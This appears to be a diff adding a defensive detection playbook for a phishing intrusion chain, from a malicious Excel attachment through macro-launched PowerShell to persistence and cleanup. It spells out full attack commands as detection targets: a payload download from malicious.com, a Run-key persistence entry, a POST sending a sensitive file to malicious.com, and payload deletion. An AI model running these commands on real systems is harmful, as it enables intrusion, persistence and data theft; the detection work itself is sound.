@@ -1,0 +1,38 @@
+1. **Identify Initial Access via Email**  
+   - Monitor for events where Microsoft Outlook is used to receive emails from suspicious domains (e.g., attacker@example.com). Capture relevant email headers and attachment details, specifically looking for attachments named "Invoice_2023.xlsx".
+
+2. **Map Opening of Malicious Attachment**  
+   - Detect when Microsoft Excel is launched with the command line containing the path to "Invoice_2023.xlsx". The command line should resemble:  
+     ```shell
+     start excel.exe "C:\\Users\\User\\Downloads\\Invoice_2023.xlsx"
+     ```
+
+3. **Validate Macro Execution**  
+   - Look for events where Microsoft Excel executes macros. Specifically, track instances where PowerShell is invoked from within Excel with the command line that includes:  
+     ```shell
+     powershell.exe -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'http://malicious.com/payload.exe' -OutFile 'C:\\Users\\User\\AppData\\Local\\Temp\\payload.exe'"
+     ```
+
+4. **Capture Payload Execution**  
+   - Monitor for the execution of the downloaded executable "payload.exe". The relevant command line should be:  
+     ```shell
+     start C:\\Users\\User\\AppData\\Local\\Temp\\payload.exe
+     ```
+
+5. **Detect Registry Modification for Persistence**  
+   - Identify events where registry modifications occur, specifically looking for entries created under `HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`. The command line for this action should be:  
+     ```shell
+     reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "MaliciousPayload" /t REG_SZ /d "C:\\Users\\User\\AppData\\Local\\Temp\\payload.exe" /f
+     ```
+
+6. **Monitor Data Exfiltration Attempts**  
+   - Track PowerShell commands that attempt to exfiltrate data, particularly those that use `Invoke-WebRequest` to send data to an external server. The command line should include:  
+     ```shell
+     powershell.exe -Command "Invoke-WebRequest -Uri 'http://malicious.com/exfiltrate' -Method POST -Body (Get-Content 'C:\\Users\\User\\Documents\\SensitiveData.txt')"
+     ```
+
+7. **Identify Cleanup and Evasion Activities**  
+   - Detect instances where PowerShell is used to delete temporary files, specifically looking for commands that remove "payload.exe". The command line should be:  
+     ```shell
+     Remove-Item 'C:\\Users\\User\\AppData\\Local\\Temp\\payload.exe' -Force
+     ```
